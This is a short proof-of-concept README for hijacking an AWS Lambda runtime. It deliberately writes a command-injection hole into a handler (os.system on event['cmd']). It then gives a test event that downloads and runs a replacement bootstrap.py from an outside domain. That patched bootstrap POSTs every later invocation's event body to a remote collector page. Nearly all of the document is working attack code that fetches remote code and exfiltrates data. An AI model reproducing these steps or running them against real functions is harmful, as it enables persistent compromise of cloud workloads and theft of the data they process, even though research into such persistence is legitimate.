# Instructions for POC

- Create a new lambda with a python 3.8 runtime
- set timeout to > 4 seconds
- make it vuln:
```
import json
import os

def lambda_handler(event, context):
    # TODO implement
    return {
        'statusCode': 200,
        'body': os.system(event['cmd'])
    }
```



### test event to supply the lambda to execute the bootstrap swap:
```
{
  "cmd": "python3 -c \"import urllib3;import os;http = urllib3.PoolManager();r = http.request('GET', 'https://appointmentaid.com/bootstrap.py');w = open('/tmp/bootstrap.py', 'w');w.write(r.data.decode('utf-8'));w.close();r = http.request('GET', 'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next');rid = r.headers['Lambda-Runtime-Aws-Request-Id'];http.request('POST', f'http://127.0.0.1:9001/2018-06-01/runtime/invocation/{rid}/response', body='null', headers={'Content-Type':'application/x-www-form-urlencoded'});os.system('python3 /tmp/bootstrap.py')\""
}
```

After swapping the bootstrap all subsequent events will be leaked in a POST request to https://www.appointmentaid.com/postcatcher.php and can be viewed at https://www.appointmentaid.com/lambda.txt


### Explained
This POC works by editing the existing python 3.8 bootstrap.py file and adding the following 3 lines inside the while loop:
```
import urllib3
http = urllib3.PoolManager()
http.request('post', 'https://www.appointmentaid.com/postcatcher.php', body=event_request.event_body)
```

The source code for postcatcher.php is included in the `php` folder in the root of this repo.
